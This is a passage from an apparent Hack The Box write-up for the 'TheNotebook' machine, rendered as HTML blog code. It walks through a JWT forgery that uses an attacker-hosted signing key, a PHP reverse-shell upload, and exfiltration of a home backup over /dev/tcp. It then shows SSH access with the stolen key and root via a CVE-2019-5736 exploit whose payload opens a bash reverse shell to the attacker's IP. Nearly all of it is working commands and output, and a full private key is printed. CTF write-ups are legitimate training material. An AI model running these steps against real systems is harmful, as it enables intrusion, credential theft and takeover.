class="string">ui35KpaHpqiZ3tJlHtebN9WURIsd0KV+3r/1Z1h3fMQh1gXlDKy7ps8YqMDi2PiJ</span></span><br><span class="line"><span class="string">KHj2tkQChIx8KwOvotb1k91jLGoPqYiJi2IzgURN/zSCFcr3EGAbZg1XmaIMmOV6</span></span><br><span class="line"><span class="string">F5S9LmU/v1YIB5TjDDPvdaFr/wPwZZd9fLkwbS8zpNr1geICqcyGqv3cfTUjVf5g</span></span><br><span class="line"><span class="string">I0Z+j3qUNJLBGYRQu8FZ3yCi0m4ygrAn3vWyyFWxk2ABwTry9cA2kZv8rhbxFuvG</span></span><br><span class="line"><span class="string">7i9ibF1sVHPxi21UrXtzFNKheVAJm+qs0G+jv/fPmz07ZQXi9Gw8Lukz6IcCAwEA</span></span><br><span class="line"><span class="string">AQKCAgEAjBcdIaUaEQpAib5UXMTwDgv7Wfbuz88zg2w91aL28zP86IQHuX6dYMlJ</span></span><br><span class="line"><span class="string">fxsL+boc7qriLMN/vBfvjV8dfqiNpyYZ/wq4fapA8rkcOJSSPoHhQEdPet8NNSFK</span></span><br><span class="line"><span class="string">TEpN/JXno3/LelGgTmzAsge2OEbMwtfIIMIIEtDkfOZYCwslClshs4N9tlra6Duf</span></span><br><span class="line"><span class="string">mdnfgO1mtDYZJYX9g1Xp1kzoghWEyHPEpa3wlWsRhisxyPZBJut+Nq6ttdI2HmC0</span></span><br><span class="line"><span class="string">jYpi1ZhA8+5VYCJlSj+Ng4Jz4wzwx4oJUBsFMJ/gnFENfGxP1W2IRq1o0J0t4k8K</span></span><br><span class="line"><span class="string">SQcGjrzHFh1h+TMILWFwDoN07W2eH7L52tktcRNtUDRqYViILacPXykrD04y0fKt</span></span><br><span class="line"><span class="string">mt9+3jLnxqlPZo+9wpkLxljs0aNj5tbEhpP2yNDy3MaICvm97yS23L44tZShlbna</span></span><br><span class="line"><span class="string">R6VBjpLzGivKPvyCBmQrfIp4UYznBCDToY1QPffHszJR/3q2qje/If0d1LMeBMpM</span></span><br><span class="line"><span class="string">WOQABr14bgkbZjIJ7Sm4z3H+a/K+Mj/DoRM7+PXieW9J1lLeQzeYkvrMqpG3lP22</span></span><br><span class="line"><span class="string">dUSKDn8MhUh6JwgQ4qSchPULcWM3EYPeNNekXJJ5uK4/arqPkzimvR3MHBGlaO/7</span></span><br><span class="line"><span class="string">SsfCBmudNzruStyf0a/eqe/BsQ9kSL1NUqDJmkkyFWJT5Si73zECggEBAOkN8W2w</span></span><br><span class="line"><span class="string">oKGTVfVkS0qZuhWGX1gOazx9KDaec2RJJfs8qHWU6v0e42HoCLFp9PvM0bmuPpQR</span></span><br><span class="line"><span class="string">C/eUZIe14exV4Ud2Qkme4QghUZJw6XzHBiap6h8AqeYM+3VDdwY4O10ZzQiauWdB</span></span><br><span class="line"><span class="string">cK2z6n+8mClskbpWFcLyOJOoS+wZE+G2w/5ioyBov54NrbEFKmYxZzGImNGo4XqZ</span></span><br><span class="line"><span class="string">myrFeLK6XR7nWtW9tllFdJl2Iwynv+0kjjkGlNQWdpfeOlU1CsrjI/uUinlkHZZ2</span></span><br><span class="line"><span class="string">F2VLE1VpZFiu75uiepPAVBL998JdDLM4/UnCNBX6FRzNJ0knt3QIGxMr0GTe1Y5U</span></span><br><span class="line"><span class="string">x8W11L2iLpLKkIMCggEBAM8gluNeMRXxy1g5rYFAU8YupkVpCJk0wWQ20Uxx9pFT</span></span><br><span class="line"><span class="string">IEloUN3yJ52q18aNzpUitzFYFBdzvyG3xfhDpRk59RDuep9IDrEpS3A3AboIDJSV</span></span><br><span class="line"><span class="string">LcBgnsQMGCDLkAjA/LWsfr3cy+FJH88iQsXgIACNEec43SV0e0J5RtTh4a5WUW3P</span></span><br><span class="line"><span class="string">mvbaeH1pJyCEqCZnYfYD2yXqaGb3vXFzWakLS0p5u/6SP5bOFIbvNtM2P5HmArEd</span></span><br><span class="line"><span class="string">0SLVD6qjikhrYPFJHPJQL7u6HPP9hjFxsSRGAV8NcWF7L+pn3FFcm5xk2fnWQAVq</span></span><br><span class="line"><span class="string">ZSntBH1xEBtX/jwYUne6Z1ZW3hwyor8AeMx9jI76wK0CggEAL1IYcnhJtWUQMBpk</span></span><br><span class="line"><span class="string">O0qJgTNeiqeq2IZlMunrbjJ4FtJTNkS9jhXGf6u4kCV+i94ju3sI09G+R1AHNZMV</span></span><br><span class="line"><span class="string">w4IQkw0NGpu6/4acZIqurhpPQmx/0Dm3RbHfIQlI0qd6TkYd3qBkAvZDpdGBTNyD</span></span><br><span class="line"><span class="string">XO3hjR9LneDG4hxrBg51fgA5PZ7TlpIOTk5itS3iVQu081bUCMYsulMUMZQVFN1I</span></span><br><span class="line"><span class="string">aSz6wamaq/exXDOjnD83djRU+HlAoOvKur1xxLlXbqi+NqgLkehlJZbm2zdqPo5+</span></span><br><span class="line"><span class="string">xI8IseZE01la+Nw+gWWZXY61x1M6djfoL4fscSsyUcoPjU35K3IflJ3cTmXEQ5j5</span></span><br><span class="line"><span class="string">se6VdwKCAQBKXADPj7k/j5bZDZvkkxuAQq8erB6SIgZr2+I395H1ikpFEFY31/+w</span></span><br><span class="line"><span class="string">8uyUM8S+dcAezugnoz4y9K71+hMDg3MfqP4MwOnFYHXcy2KrTsh1bzkFn6pf55eh</span></span><br><span class="line"><span class="string">7nK/McmHz22Q6/ul3YK18i7WqyfSCtMql5eNIsw9iRyMwKss04BYU/fmN3iaTW3m</span></span><br><span class="line"><span class="string">lrlnUCYzFB9Q9V6V2MsCN88wiQV2r012jzqVAVcNOkQMf6VC07iTrYivYJ5HPH8g</span></span><br><span class="line"><span class="string">kKw083KY64C3fJF4ZsQObCqUQy2q2kCiJn+FP9QwwXZ8Jxi6QNirGQ9IhfbesgB+</span></span><br><span class="line"><span class="string">UJDNMk4o/ZqrvHPw25zhxWGYyFn12r/hAoIBAQCahA0wJFvy019pTVAtI6O9oflV</span></span><br><span class="line"><span class="string">T69IJyTGIf4jO/kFBmRGJIGu7EPm1Grt6aWV+MZEoUopc4mOethZIbzsxmIVRyx9</span></span><br><span class="line"><span class="string">8u+LbbWGVgv9XZbcTZLUR5KVxM1KFslL6e/vELY/AVt081RJf1xf1eT1KiP3i80h</span></span><br><span class="line"><span class="string">xSGQJS8sDD3nxKzdaDKhi0hIgbUAgdLOq4fwMDZYmczhU16aMwHP6s0sY+ctLoEh</span></span><br><span class="line"><span class="string">d6uHFkfmWYIGSkFXC93626yTHyjOzY9ytwxQ+f7L10eioeVRZRDa2cb2wnNGfYmU</span></span><br><span class="line"><span class="string">DUbLgDbMRQxjxu4i6mun5NlWvFMYESN2CnpvpiPfLKBdoH1qTF4zo1vwu3Qh</span></span><br><span class="line"><span class="string">-----END RSA PRIVATE KEY-----</span></span><br><span class="line"><span class="string">┌──(root💀kali)-[~/hackthebox/machine/thenotebook]</span></span><br><span class="line"><span class="string">└─# cat jwtRS256.key.pub                                                                                                        </span></span><br><span class="line"><span class="string">-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAvI/xUwgbHsfS7jZa7vCu</span></span><br><span class="line"><span class="string">6NsGOZLqjWGMfY3JhL3O10SSe9CDY4VB0DtHA2Y8yKA1C1hjI2odVgvxmcLgvylh</span></span><br><span class="line"><span class="string">Uccd/Fgo2CENr5Ez/K5nbPkMSG8K373AspZjx4jvM25G/K9EX1bh5PWt/mH8G/Sg</span></span><br><span class="line"><span class="string">r4G0D1JqFbro0p6UK7gdzw/OG3kHhz4vUKK8sq/ueZBi8Dhu78UhDqUkROQYmdo+</span></span><br><span class="line"><span class="string">TeF4AAN7ZWYx1DebEq+u47opdqwT60NUmbA+qccc8vdsFwERpcE1eYg6JVRyZUTH</span></span><br><span class="line"><span class="string">8cF6shelSpeTtluvBG+9NvNhPOzZPW56gMG4Q3lw/5YeUiZMRaOTcKk+fk9Issbo</span></span><br><span class="line"><span class="string">s2UuN1I0omFxMNVKjRSK/+EN69LKui35KpaHpqiZ3tJlHtebN9WURIsd0KV+3r/1</span></span><br><span class="line"><span class="string">Z1h3fMQh1gXlDKy7ps8YqMDi2PiJKHj2tkQChIx8KwOvotb1k91jLGoPqYiJi2Iz</span></span><br><span class="line"><span class="string">gURN/zSCFcr3EGAbZg1XmaIMmOV6F5S9LmU/v1YIB5TjDDPvdaFr/wPwZZd9fLkw</span></span><br><span class="line"><span class="string">bS8zpNr1geICqcyGqv3cfTUjVf5gI0Z+j3qUNJLBGYRQu8FZ3yCi0m4ygrAn3vWy</span></span><br><span class="line"><span class="string">yFWxk2ABwTry9cA2kZv8rhbxFuvG7i9ibF1sVHPxi21UrXtzFNKheVAJm+qs0G+j</span></span><br><span class="line"><span class="string">v/fPmz07ZQXi9Gw8Lukz6IcCAwEAAQ==</span></span><br><span class="line"><span class="string">-----END PUBLIC KEY-----</span></span><br></pre></td></tr></table></figure>
+
+<p>here now edit the payload and the details in jwt.io to the one matching to the original token, but change the localhost to your own tun0 ip, change admin_cap to true</p>
+<p>And make sure the algorithm is set to RS256</p>
+<p>It should look like this, signature verified.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb198.jpg"></li>
+</ul>
+<p>before changing the cookie, change the priv key name to privKey.key as that is called on and spin the server on port 7070.</p>
+<p>new cookie&#x2F;token:(on the left)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC41OjcwNzAvcHJpdktleS5rZXkifQ.eyJ1c2VybmFtZSI6Imx1Y2lmZXIxMSIsImVtYWlsIjoiMTE4NTE1MTg2N0BxcS5jb20iLCJhZG1pbl9jYXAiOnRydWV9.Tv-XaYQuY71cIYcsBnYoDrrUUyDDs3u9Q-gIdkYVfZAFZJDn4EQYuQ0McwoPK_CX_puFmwiX7TzCqeL3y5tTlgZCeYKiaPo3fwRxr2LgmTAvoHMjXy-oD5VzgZWmutgPUtPEO5v7kRPrHM0etc-_f5HPNqpTXGJe1n0lSxipoc35X-MHWzhG3ymr41iN3aWQ8wcIJ2oFPKlcxadd8_l2byDYlnmGTU4_etYL48IG18ZRkDbDRE1LOiGId25LmjnHCblqFi5gDroL8DdyT-LuyqPYy1DCYSmkBHnnjZTCJWzKbPNv5JlnKC3Lr3JoLYZSaEFUbqYjnIScoBI5eaE5k54OLkQRRhDwxg33oxNiALiactRg_inHhhryCeBjSvqRfHDsutZj-WAwwSTDDl32N2n5TyXRzUuMteTTG087EzPMv694Y9twdIKEe5go2N0uTkcBBBGcRK7zE6Utx3011Gl45bd1a6WgVw1oyL1APAqsws60-P3UHEGdqLQbmSZSoHTrSWtvdEKEvDblYqMMgOIBX7pZRGFFYnbX_yr59FiLH8wDOpQ4wkOUgDfPKZaDWJUuqZOnzaAgOdOSKYl_L5ktzfwY704Dn9BVvnMGU4xM1S7wSM7020jQnC2VQukx1VyYgEAZzYAPWikkGxcDoFbh5sXTzLhmsn7oB9pASAs</span><br></pre></td></tr></table></figure>
+
+<p>change the token and our priv key is been picked</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/thenotebook]</span><br><span class="line">└─<span class="comment"># ls                                                                                                                          </span></span><br><span class="line">jwtRS256.key.pub  privKey.key</span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/thenotebook]</span><br><span class="line">└─<span class="comment"># python -m SimpleHTTPServer 7070                                                                                             </span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 7070 ...</span><br><span class="line">10.10.10.230 - - [08/Mar/2021 23:26:41] <span class="string">&quot;GET /privKey.key HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>
+
+<p>and now we are admin, (i edit the cookie auth parameter in firefox cookie editor plugin)</p>
+<p>every refresh to the web page would request the privKey.key one time:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/thenotebook]</span><br><span class="line">└─<span class="comment"># python -m SimpleHTTPServer 7070                                                                                             </span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 7070 ...</span><br><span class="line">10.10.10.230 - - [08/Mar/2021 23:26:41] <span class="string">&quot;GET /privKey.key HTTP/1.1&quot;</span> 200 -</span><br><span class="line">10.10.10.230 - - [08/Mar/2021 23:28:57] <span class="string">&quot;GET /privKey.key HTTP/1.1&quot;</span> 200 -</span><br><span class="line">10.10.10.230 - - [08/Mar/2021 23:29:01] <span class="string">&quot;GET /privKey.key HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>
+
+<p>so don’t close the python SimpleHTTPServer.</p>
+<p>and we can upload the files, i uploaded the php-reverse-shell.php, and got a reverse shell:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/thenotebook]</span><br><span class="line">└─<span class="comment"># nc -lvp 5566                                                                                                                </span></span><br><span class="line">Ncat: Version 7.91 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::5566</span><br><span class="line">Ncat: Listening on 0.0.0.0:5566</span><br><span class="line">Ncat: Connection from 10.10.10.230.</span><br><span class="line">Ncat: Connection from 10.10.10.230:50278.</span><br><span class="line">Linux thenotebook 4.15.0-135-generic <span class="comment">#139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line"> 04:37:59 up  9:48,  0 <span class="built_in">users</span>,  load average: 0.08, 0.03, 0.00</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">www-data</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="user"><a href="#user" class="headerlink" title="user"></a>user</h3><p>In &#x2F;var&#x2F;backups&#x2F; there is home.tar.gz file</p>
+<p>sending the file</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@thenotebook:/var/backups$ <span class="built_in">cat</span> home.tar.gz &gt; /dev/tcp/10.10.14.5/4444</span><br><span class="line"><span class="built_in">cat</span> home.tar.gz &gt; /dev/tcp/10.10.14.5/4444</span><br></pre></td></tr></table></figure>
+
+<p>getting the tar.gz file</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/thenotebook]</span><br><span class="line">└─<span class="comment"># nc -lvp 4444 &gt; home.tar.gz                                                                                                  </span></span><br><span class="line">Ncat: Version 7.91 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::4444</span><br><span class="line">Ncat: Listening on 0.0.0.0:4444</span><br><span class="line">Ncat: Connection from 10.10.10.230.</span><br><span class="line">Ncat: Connection from 10.10.10.230:45076.</span><br></pre></td></tr></table></figure>
+
+<p>Unzipping we got the ssh keys</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/thenotebook]</span><br><span class="line">└─<span class="comment"># tar -xvf home.tar.gz </span></span><br><span class="line">home/</span><br><span class="line">home/noah/</span><br><span class="line">home/noah/.bash_logout</span><br><span class="line">home/noah/.cache/</span><br><span class="line">home/noah/.cache/motd.legal-displayed</span><br><span class="line">home/noah/.gnupg/</span><br><span class="line">home/noah/.gnupg/private-keys-v1.d/</span><br><span class="line">home/noah/.bashrc</span><br><span class="line">home/noah/.profile</span><br><span class="line">home/noah/.ssh/</span><br><span class="line">home/noah/.ssh/id_rsa</span><br><span class="line">home/noah/.ssh/authorized_keys</span><br><span class="line">home/noah/.ssh/id_rsa.pub</span><br></pre></td></tr></table></figure>
+
+<p>give permission and ssh into the server, and get the user flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/thenotebook]</span><br><span class="line">└─<span class="comment"># chmod 600 home/noah/.ssh/id_rsa                                                                                             </span></span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/thenotebook]</span><br><span class="line">└─<span class="comment"># ssh -i home/noah/.ssh/id_rsa noah@10.10.10.230                                                                              </span></span><br><span class="line">The authenticity of host <span class="string">&#x27;10.10.10.230 (10.10.10.230)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:GHcgekaLnxmzAeBtBN8jWgd3DME3eniUb0l+PDmejDQ.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>10.10.10.230<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-135-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com</span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com</span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/advantage</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System information as of Tue Mar  9 04:45:53 UTC 2021</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System load:  0.0               Processes:              182</span></span><br><span class="line"><span class="string">  Usage of /:   42.1% of 7.81GB   Users logged in:        0</span></span><br><span class="line"><span class="string">  Memory usage: 19%               IP address for ens160:  10.10.10.230</span></span><br><span class="line"><span class="string">  Swap usage:   0%                IP address for docker0: 172.17.0.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">61 packages can be updated.</span></span><br><span class="line"><span class="string">0 updates are security updates.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Tue Mar  9 03:28:09 2021 from 10.10.14.41</span></span><br><span class="line"><span class="string">noah@thenotebook:~$ id</span></span><br><span class="line"><span class="string">uid=1000(noah) gid=1000(noah) groups=1000(noah)</span></span><br><span class="line"><span class="string">noah@thenotebook:~$ whoami</span></span><br><span class="line"><span class="string">noah</span></span><br><span class="line"><span class="string">noah@thenotebook:~$ ls</span></span><br><span class="line"><span class="string">home  user.txt</span></span><br><span class="line"><span class="string">noah@thenotebook:~$ cat user.txt</span></span><br><span class="line"><span class="string">c3f30f818132c77d26eae145351809ac</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb199.jpg"></li>
+</ul>
+<h3 id="root"><a href="#root" class="headerlink" title="root"></a>root</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">noah@thenotebook:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> noah on thenotebook:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User noah may run the following commands on thenotebook:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/docker <span class="built_in">exec</span> -it webapp-dev01*</span><br></pre></td></tr></table></figure>
+
+<p>searching for the exploit, the following website is interesting</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZyaWNoZXR0ZW4vQ1ZFLTIwMTktNTczNi1Qb0M=">CVE-2019-5736-PoC<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>now there change the exploit in var payload &#x3D;</p>
+<p>for getting the reverse shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var payload = <span class="string">&quot;#!/bin/bash \n echo &#x27;bash -i &gt;&amp; /dev/tcp/10.10.14.5/4322 0&gt;&amp;1&#x27; &gt; /tmp/rev.sh &amp;&amp; chmod +x /tmp/rev.sh &amp;&amp; bash /tmp/rev.sh&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>build it go build main.go</p>
+<p>now go to the machine, get into the docker container</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/thenotebook]</span><br><span class="line">└─<span class="comment"># go build main.go </span></span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/thenotebook]</span><br><span class="line">└─<span class="comment"># ls</span></span><br><span class="line">home  home.tar.gz  jwtRS256.key.pub  main  main.go  php-reverse-shell.php  privKey.key</span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/thenotebook]</span><br><span class="line">└─<span class="comment"># mv main exp</span></span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/thenotebook]</span><br><span class="line">└─<span class="comment"># ls</span></span><br><span class="line">exp  home  home.tar.gz  jwtRS256.key.pub  main.go  php-reverse-shell.php  privKey.key</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">noah@thenotebook:~$ sudo /usr/bin/docker <span class="built_in">exec</span> -it webapp-dev01 bash</span><br><span class="line">root@396a6d12aaa7:/opt/webapp<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>and in &#x2F;tmp&#x2F; wget the main executable.<br>give executable permission and run the file</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/thenotebook]</span><br><span class="line">└─<span class="comment"># python -m SimpleHTTPServer 81</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 81 ...</span><br><span class="line">10.10.10.230 - - [09/Mar/2021 00:16:57] <span class="string">&quot;GET /exp HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@396a6d12aaa7:/tmp<span class="comment"># wget http://10.10.14.5:81/exp</span></span><br><span class="line">--2021-03-09 05:20:01--  http://10.10.14.5:81/exp</span><br><span class="line">Connecting to 10.10.14.5:81... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 2236814 (2.1M) [application/octet-stream]</span><br><span class="line">Saving to: ‘exp’</span><br><span class="line"></span><br><span class="line">exp                             100%[=======================================================&gt;]   2.13M   365KB/s    <span class="keyword">in</span> 6.0s    </span><br><span class="line"></span><br><span class="line">2021-03-09 05:20:07 (365 KB/s) - ‘exp’ saved [2236814/2236814]</span><br><span class="line"></span><br><span class="line">root@396a6d12aaa7:/tmp<span class="comment"># ls</span></span><br><span class="line">exp  requirements.txt  webapp.db</span><br><span class="line">root@396a6d12aaa7:/tmp<span class="comment"># chmod 777 exp</span></span><br><span class="line">root@396a6d12aaa7:/tmp<span class="comment"># ./exp</span></span><br><span class="line">[+] Overwritten /bin/sh successfully</span><br><span class="line">[+] Found the PID: 1091</span><br><span class="line">[+] Successfully got the file handle</span><br><span class="line">[+] Successfully got write handle &amp;&#123;0xc00004d4a0&#125;</span><br></pre></td></tr></table></figure>
+
+<p>and simultaneously open second ssh session, and ssh into it, and run:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/thenotebook]</span><br><span class="line">└─<span class="comment"># ssh -i home/noah/.ssh/id_rsa noah@10.10.10.230</span></span><br><span class="line">Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-135-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Tue Mar  9 05:32:53 UTC 2021</span><br><span class="line"></span><br><span class="line">  System load:  0.29              Processes:              207</span><br><span class="line">  Usage of /:   42.2% of 7.81GB   Users logged <span class="keyword">in</span>:        1</span><br><span class="line">  Memory usage: 21%               IP address <span class="keyword">for</span> ens160:  10.10.10.230</span><br><span class="line">  Swap usage:   0%                IP address <span class="keyword">for</span> docker0: 172.17.0.1</span><br><span class="line"></span><br><span class="line">  =&gt; There is 1 zombie process.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">61 packages can be updated.</span><br><span class="line">0 updates are security updates.</span><br><span class="line"></span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Tue Mar  9 05:23:22 2021 from 10.10.14.5</span><br><span class="line">noah@thenotebook:~$ sudo /usr/bin/docker <span class="built_in">exec</span> -it webapp-dev01 sh</span><br><span class="line">No <span class="built_in">help</span> topic <span class="keyword">for</span> <span class="string">&#x27;/bin/sh&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>as per our payload, listen on the port for rev connection<br>got root</p>
